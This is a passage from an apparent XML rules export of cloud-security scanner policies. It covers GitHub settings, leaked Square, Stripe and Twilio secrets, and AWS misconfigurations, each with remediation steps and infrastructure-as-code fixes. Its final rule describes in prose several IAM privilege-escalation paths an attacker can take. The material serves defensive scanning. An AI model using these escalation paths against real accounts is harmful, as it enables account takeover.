<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitHub Enterprise Cloud and GitHub AE, you can restrict access to organization assets by configuring an allow list for specific IP addresses. For example, it is possible to allow access from only the IP address of a trusted CIDR. The allow list for IP addresses will block access via the web, API, and Git from any IP addresses that are not on the allow list.</p>
<p>To enforce the IP allow list, you must first add IP addresses to the list, then enable the IP allow list. You must add your current IP address, or a matching range, before you enable the IP allow list.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-has-ip-allow-list-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-has-ip-allow-list-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-has-ip-allow-list-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_4</key>
    <name>Ensure GitHub branch protection rules requires signed commits</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-branch-protection-rules-do-not-include-signed-commits"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-branch-protection-rules-do-not-include-signed-commits"></div>GitHub branch protection rules do not include signed commits</div><a aria-label="Skip link to GitHub branch protection rules do not include signed commits" class="heading-anchor-icon fa fa-anchor" href="#github-branch-protection-rules-do-not-include-signed-commits"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitHub, Branch Protection Rules define whether collaborators can delete or force push to the branch and set requirements for any pushes to the branch, such as passing status checks or a linear commit history.</p>
<p>When you enable required commit signing on a branch, contributors and bots can only push commits that have been signed and verified to the branch. If a collaborator pushes an unsigned commit to a branch that requires commit signatures, the collaborator will need to rebase the commit to include a verified signature, then force push the rewritten commit to the branch.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_branch_protection, github_branch_protection_v3</li>
<li>Attribute: require_signed_commits</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_branch_protection_v3" "example" {
...
+  require_signed_commits = true
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_16</key>
    <name>Square OAuth Secret</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="square-oauth-secret"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-square-o-auth-secret"></div>Square OAuth Secret</div><a aria-label="Skip link to Square OAuth Secret" class="heading-anchor-icon fa fa-anchor" href="#square-oauth-secret"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Square OAuth API uses the OAuth 2 protocol to get permission from the owner of the seller account to manage specific types of resources in that account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">POST /oauth2/revoke</code>: Revokes an access token generated with the OAuth flow.<br/>
If an account has more than one OAuth access token for your application, this endpoint revokes all of them, regardless of which token you specify. When an OAuth access token is revoked, all of the active subscriptions associated with that OAuth token are canceled immediately.</p>
<p>Replace APPLICATION_SECRET with the application secret on the OAuth page in the developer dashboard.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">Authorization: Client APPLICATION_SECRET
</code></pre></div></div>
<p>Step 2: Clean the git history.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_16' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_16</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_16' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_17</key>
    <name>Stripe Access Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="stripe-access-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-stripe-access-key"></div>Stripe Access Key</div><a aria-label="Skip link to Stripe Access Key" class="heading-anchor-icon fa fa-anchor" href="#stripe-access-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Stripe authenticates your API requests using your account&#8217;s API keys. If you do not include your key when making an API request, or use one that is incorrect or outdated, Stripe returns an error.</p>
<p>Secret API keys should be kept confidential and only stored on your own servers. Your account&#8217;s secret API key can perform any API request to Stripe without restriction.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>Users with Administrator permissions can access a Stripe account&#8217;s API keys by navigating to the Developers section of the Stripe dashboard and clicking on API Keys.</p>
<p>If you no longer need a restricted key (or you suspect it has been compromised), you can revoke it at any time. You can also edit the key to change its level of access.</p>
<p>Step 2: Clean the git history.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_17' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_17</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_17' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_18</key>
    <name>Twilio API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="twilio-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-twilio-api-key"></div>Twilio API Key</div><a aria-label="Skip link to Twilio API Key" class="heading-anchor-icon fa fa-anchor" href="#twilio-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Twilio Access Tokens are short-lived tokens that you can use to authenticate Twilio Client SDKs like Voice, Conversations, Sync, and Video.</p>
<p>You create them on your server to verify a client&#8217;s identity and grant access to client API features. All tokens have a limited lifetime, configurable up to 24 hours. However, a best practice is to generate Access Tokens for the shortest amount of time feasible for your application.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.</p>
<p>The following method deletes an API Key. This revokes its authorization to authenticate to the REST API and invalidates all Access Tokens generated using its secret.</p>
<p>If the delete is successful, Twilio will return an HTTP 204 response with no body.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">DELETE https://api.twilio.com/2010-04-01/Accounts/{AccountSid}/Keys/{Sid}.json
</code></pre></div></div>
<p>Step 2: Clean the git history.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_18' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_18</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_18' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_19</key>
    <name>Hex High Entropy String</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="hex-high-entropy-string"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-hex-high-entropy-string"></div>Hex High Entropy String</div><a aria-label="Skip link to Hex High Entropy String" class="heading-anchor-icon fa fa-anchor" href="#hex-high-entropy-string"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password Entropy is a concept used to assign a numerical score to how unpredictable a password is or the likelihood of highly random data in a string of characters. The policy calculates entropy levels using a Shannon Entropy calculator. The entropy levels of keys are important, as the more or less information required to determine unknown key variables can alter how difficult it is to crack. If a high-entropy string is detected, the string is printed to the screen.</p>
<p>This check scans the branch and evaluates the entropy for both the hexadecimal character set for every blob of text.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
Start by understanding what services were impacted and refer to the corresponding API documentation to learn how to revoke and rotate the secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_19' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_19</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_19' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_23</key>
    <name>Ensure every Security Group rule has a description</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-every-security-group-rule-has-a-description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-every-security-group-rule-has-a-description"></div>Not every Security Group rule has a description</div><a aria-label="Skip link to Not every Security Group rule has a description" class="heading-anchor-icon fa fa-anchor" href="#not-every-security-group-rule-has-a-description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Descriptions can be up to 255 characters long and can be set and viewed from the AWS Management Console, AWS Command Line Interface (CLI), and the AWS APIs.</p>
<p>We recommend you add descriptive text to each of your Security Group Rules clarifying each rule's goals, this helps prevent developer errors.  </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="http://console.aws.amazon.com/vpc/home" target="_self">Amazon VPC console</a>.</li>
<li>Select <strong>Security Groups</strong>.</li>
<li>Select <strong>Create Security Group</strong>.</li>
<li>Select a <em>Security Group</em> and review all of the descriptions.</li>
<li>To modify the rules and descriptions, click <strong>Edit</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Add a description to your ingress or egress rule.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_security_group.examplea.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_security_group.examplea.tf">resource "aws_security_group" "examplea" {
  name        = var.es_domain
  description = "Allow inbound traffic to ElasticSearch from VPC CIDR"
  vpc_id      = var.vpc


  ingress {
    cidr_blocks = ["10.0.0.0/16"]
   + description = "What does this rule enable"
    from_port   = 80
    protocol    = "tcp"
    to_port     = 80
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_31' target='_blank'> https://docs.bridgecrew.io/docs/networking_31</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_31' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_33</key>
    <name>Ensure KMS key policy does not contain wildcard (*) principal</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kms-key-policy-contains-wildcard--principal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kms-key-policy-contains-wildcard-principal"></div>KMS key policy contains wildcard (*) principal</div><a aria-label="Skip link to KMS key policy contains wildcard (*) principal" class="heading-anchor-icon fa fa-anchor" href="#kms-key-policy-contains-wildcard--principal"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buidtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buidtime"></div>Fix - Buidtime</div><a aria-label="Skip link to Fix - Buidtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buidtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::KMS::Key</li>
<li><strong>Argument:</strong> Properties.Statement.Principal</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::KMS::Key
    Properties:
        ...
        Statement:
            - ...
        Principal:
-           "*"
-           AWS: "*"
+                   AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:root'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-kms-key-policy-does-not-contain-wildcard-principal' target='_blank'> https://docs.bridgecrew.io/docs/ensure-kms-key-policy-does-not-contain-wildcard-principal</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-kms-key-policy-does-not-contain-wildcard-principal' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_104</key>
    <name>Ensure DocDB has audit logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="docdb-does-not-have-audit-logs-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-doc-db-does-not-have-audit-logs-enabled"></div>DocDB does not have audit logs enabled</div><a aria-label="Skip link to DocDB does not have audit logs enabled" class="heading-anchor-icon fa fa-anchor" href="#docdb-does-not-have-audit-logs-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_docdb_cluster_parameter_group</li>
<li><strong>Argument</strong>:  parameter.audit_logs</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_docdb_cluster_parameter_group.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_docdb_cluster_parameter_group.test.tf">resource "aws_docdb_cluster_parameter_group" "test" {
     ...
+  parameter {
+    name  = "audit_logs"
+    value = "enabled"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::DocDB::DBClusterParameterGroup</li>
<li><strong>Argument</strong>:  Parameters.audit_logs</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    DocDBParameterGroupEnabled:
        Type: "AWS::DocDB::DBClusterParameterGroup"
        Properties:
        ...
+       Parameters: 
+       audit_logs: "enabled"
            ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-docdb-has-audit-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-docdb-has-audit-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-docdb-has-audit-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_105</key>
    <name>Ensure Redshift uses SSL</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="redshift-does-not-use-ssl"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-redshift-does-not-use-ssl"></div>Redshift does not use SSL</div><a aria-label="Skip link to Redshift does not use SSL" class="heading-anchor-icon fa fa-anchor" href="#redshift-does-not-use-ssl"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Redshift databases in which data connection to and from is occurring on an insecure channel. SSL connections ensures the security of the data in transit.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Login to the AWS and navigate to the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Amazon Redshift</code> service.</li>
<li>Expand the identified <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Redshift</code> cluster and make a note of the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Cluster Parameter Group</code></li>
<li>In the navigation panel, click on the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Parameter group</code>.</li>
<li>Select the identified <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Parameter Group</code> and click on <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Edit Parameters</code>.</li>
<li>Review the require_ssl flag. Update the parameter <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">require_ssl</code> to true and save it.<br/>
Note: If the current parameter group is a Default parameter group, it cannot be edited. You will need to create a new parameter group and point it to an affected cluster.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_redshift_parameter_group</li>
<li><strong>Argument</strong>:  parameter.require_ssl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_redshift_parameter_group" "pass" {
    ...
  parameter {
    name  = "require_ssl"
    value = "true"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Redshift::ClusterParameterGroup</li>
<li><strong>Argument</strong>:  Properties.Parameters</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Redshift::ClusterParameterGroup
    Properties:
      ...
      Parameters:
+       - ParameterName: "require_ssl"
+         ParameterValue: "true"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-redshift-uses-ssl' target='_blank'> https://docs.bridgecrew.io/docs/ensure-redshift-uses-ssl</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-redshift-uses-ssl' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_110</key>
    <name>Ensure IAM policies does not allow privilege escalation</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-policies-allow-privilege-escalation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-policies-allow-privilege-escalation"></div>IAM policies allow privilege escalation</div><a aria-label="Skip link to IAM policies allow privilege escalation" class="heading-anchor-icon fa fa-anchor" href="#iam-policies-allow-privilege-escalation"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>IAM Permissions on Other Users</strong><br/>
<em>CreateAccessKey</em><br/>
Creating a new user access key for a different user: An attacker with the iam:CreateAccessKey permission on other users can create an access key ID and secret access key belonging to another user in the AWS environment, if they don&#8217;t already have two sets associated with them (which best practice says they shouldn&#8217;t).</p>
<p><em>CreateLoginProfile</em><br/>
Creating a new login profile for an IAM user: An attacker with the iam:CreateLoginProfile permission on other users can create a password to use to login to the AWS console on any user that does not already have a login profile setup.</p>
<p><em>UpdateLoginProfile</em><br/>
Updating an existing login profile for an IAM user: An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.</p>
<p><em>AddUserToGroup</em><br/>
Adding a user to an Admin group: An attacker with the iam:AddUserToGroup permission can use it to add themselves to an existing IAM Group in the AWS account.</p>
<p><strong>Permissions on Policies</strong><br/>
<em>CreateNewPolicyVersion</em><br/>
Creating a new policy version to define custom permissions: An attacker with the iam:CreatePolicyVersion permission can create a new version of an IAM policy that they have access to. This allows them to define their own custom permissions.</p>
<p><em>SetExistingDefaultPolicyVersion</em><br/>
Setting the default policy version to an existing version: An attacker with the iam:SetDefaultPolicyVersion permission may be able to escalate privileges through existing policy versions that are not currently in use.</p>
<p><em>AttachUserPolicy</em><br/>
Attaching a higher-privileged policy to a user that they have access to: An attacker with the iam:AttachUserPolicy permission can escalate privileges by attaching a policy to a user that they have access to, adding the permissions of that policy to the attacker.</p>
<p><em>AttachGroupPolicy</em><br/>
